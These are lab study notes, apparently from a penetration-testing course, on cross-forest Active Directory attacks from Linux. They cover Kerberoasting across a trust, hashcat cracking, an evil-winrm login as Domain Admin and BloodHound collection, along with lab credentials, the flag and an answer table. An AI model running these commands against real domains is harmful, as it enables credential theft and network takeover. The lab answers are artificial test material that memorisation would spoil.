# Section 31 — Attacking Domain Trusts: Cross-Forest Abuse (Linux)

> Same cross-forest attacks as Section 30 but from a Linux attack host.
> SSH to ATTACK01: ssh htb-student@TARGET_IP (password: HTB_@cademy_stdnt!)
> Target forest: FREIGHTLOGISTICS.LOCAL | DC03 IP: 172.16.5.238

---

## QUICK REFERENCE

```bash
# Enumerate SPNs across the forest trust
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/forend

# Request TGS hashes and save to file
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/forend -outputfile cross_forest.txt

# Crack TGS hashes
hashcat -m 13100 cross_forest.txt /usr/share/wordlists/rockyou.txt -O

# Log in to foreign domain DC with cracked password
evil-winrm -i 172.16.5.238 -u sapsso -p pabloPICASSO

# BloodHound collection across both domains
# Domain 1:
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
# Domain 2 (edit /etc/resolv.conf first — see below):
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2

# Compress JSON output for BloodHound GUI import
zip -r ilfreight_bh.zip *.json
```

---

## Attack Path 1 — Cross-Forest Kerberoasting from Linux

### Step 1 — Enumerate SPN accounts in the foreign domain

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/forend
# -target-domain FREIGHTLOGISTICS.LOCAL = query THIS domain for SPN accounts instead of the current one
# INLANEFREIGHT.LOCAL/forend = authenticate using our INLANEFREIGHT credentials
# The bidirectional forest trust allows our creds to be accepted by FREIGHTLOGISTICS's KDC
# Output shows: SPN, account name, group membership (MemberOf), password last set
# Password prompt: Klmcargo2
#
# Lab output showed TWO accounts:
# MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  → Domain Admins in FREIGHTLOGISTICS
# HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    → Domain Admins in FREIGHTLOGISTICS
# Both are Domain Admins — cracking either gives full control of the foreign forest
```

### Step 2 — Request TGS hashes and save to file

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/forend -outputfile cross_forest.txt
# -request = actually request the TGS tickets (not just enumerate)
#            without this flag, only the account listing is shown — no hash
# -outputfile cross_forest.txt = write hashes directly to a file instead of stdout
#             saves having to copy-paste from terminal — important for long hashes
# The file will contain one $krb5tgs$23$... hash per kerberoastable account
# Hash format: $krb5tgs$23$ = Hashcat mode 13100 (same as domestic Kerberoasting)
```

### Step 3 — Crack the hashes

```bash
hashcat -m 13100 cross_forest.txt /usr/share/wordlists/rockyou.txt -O
# -m 13100 = Kerberos 5, etype 23, TGS-REP
# cross_forest.txt = file with one or more $krb5tgs$23$... hashes (hashcat handles multiple)
# -O = optimized kernel — faster, caps at 31 char passwords
# Lab results:
#   mssqlsvc → 1logistics
#   sapsso   → pabloPICASSO
```

### Step 4 — Access the foreign domain DC

```bash
evil-winrm -i 172.16.5.238 -u sapsso -p pabloPICASSO
# -i 172.16.5.238 = IP of ACADEMY-EA-DC03 (FREIGHTLOGISTICS domain controller)
# -u sapsso = the cracked Domain Admin account in the foreign domain
# -p pabloPICASSO = the cracked password
# We now have a WinRM shell as Domain Admin in the foreign forest
```

```powershell
type C:\Users\Administrator\Desktop\flag.txt
# Read the flag — sapsso is Domain Admin so we can access Administrator's desktop
# Lab result: burn1ng_d0wn_th3_f0rest!
```

---

## Attack Path 2 — BloodHound Collection Across Forests

**Why:** BloodHound's "Users with Foreign Domain Group Membership" query reveals cross-forest group membership (e.g., INLANEFREIGHT\administrator in FREIGHTLOGISTICS\Administrators). This is the Linux equivalent of `Get-DomainForeignGroupMember` from Section 30.

### Step 1 — Configure DNS for the primary domain

```bash
# Edit resolv.conf to point DNS at the INLANEFREIGHT domain controller
sudo nano /etc/resolv.conf

# Add/change to:
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
# Comment out external nameservers (1.1.1.1, 8.8.8.8) — they can't resolve internal names
# bloodhound-python requires a resolvable DC hostname, not just an IP
```

### Step 2 — Collect BloodHound data for INLANEFREIGHT.LOCAL

```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
# -d INLANEFREIGHT.LOCAL = target domain
# -dc ACADEMY-EA-DC01 = domain controller hostname (must be DNS-resolvable — hence the resolv.conf edit)
# -c All = collect everything: users, groups, computers, sessions, ACLs, trusts, GPOs
# -u forend -p Klmcargo2 = valid domain credentials
# Output: multiple JSON files (users.json, groups.json, computers.json, domains.json, etc.)
```

### Step 3 — Compress for BloodHound GUI import

```bash
zip -r ilfreight_bh.zip *.json
# zip = create a zip archive
# -r = recursive (include all files matching the pattern)
# *.json = all JSON files in the current directory
# BloodHound GUI accepts either individual JSON files or a single zip — zip is cleaner
```

### Step 4 — Reconfigure DNS for the foreign domain

```bash
sudo nano /etc/resolv.conf
# Change to:
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238    # ACADEMY-EA-DC03 IP
```

### Step 5 — Collect BloodHound data for FREIGHTLOGISTICS.LOCAL

```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
# -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL = use the FQDN of the foreign DC
# -u forend@inlanefreight.local = authenticate with UPN format (user@domain) when using cross-forest creds
#   Note: this uses our INLANEFREIGHT creds to collect data from FREIGHTLOGISTICS — trust enables this
# Output: a new set of JSON files for the foreign domain
# Compress and upload to BloodHound GUI separately or together with the first set
```

### Step 6 — Query in BloodHound GUI

```
Analysis tab → "Users with Foreign Domain Group Membership"
→ Source domain: INLANEFREIGHT.LOCAL
→ Shows: ADMINISTRATOR@INLANEFREIGHT.LOCAL is a member of ADMINISTRATORS@FREIGHTLOGISTICS.LOCAL
→ This confirms: owning INLANEFREIGHT admin = owning FREIGHTLOGISTICS admin (foreign group membership)
```

---

## Lab Answers

| Question | Answer |
|----------|--------|
| Second SPN account (aside from mssqlsvc) | `sapsso` |
| sapsso cleartext password | `pabloPICASSO` |
| Flag at C:\Users\Administrator\Desktop\flag.txt on DC03 | `burn1ng_d0wn_th3_f0rest!` |

---

## Exam Notes

- `GetUserSPNs.py -target-domain FOREIGN` = cross-forest Kerberoast — add `-target-domain` and use current domain creds
- `-outputfile` = always use it for Kerberoasting — avoids long hash copy-paste errors
- Both cross-forest SPN accounts were Domain Admins — always check `MemberOf` column in GetUserSPNs output
- bloodhound-python requires DNS resolution — edit `/etc/resolv.conf` to point at the target DC before running
- Use `forend@inlanefreight.local` (UPN format) when collecting BloodHound data from a foreign domain
- BloodHound query "Users with Foreign Domain Group Membership" = Linux equivalent of `Get-DomainForeignGroupMember`
- After cross-forest Kerberoast: check password reuse — same password may work for similarly named accounts in your current domain
- evil-winrm works across forest trusts — if you have creds for a DA in the foreign domain, just connect directly
- Compress BloodHound JSON output with `zip -r name.zip *.json` before uploading to GUI
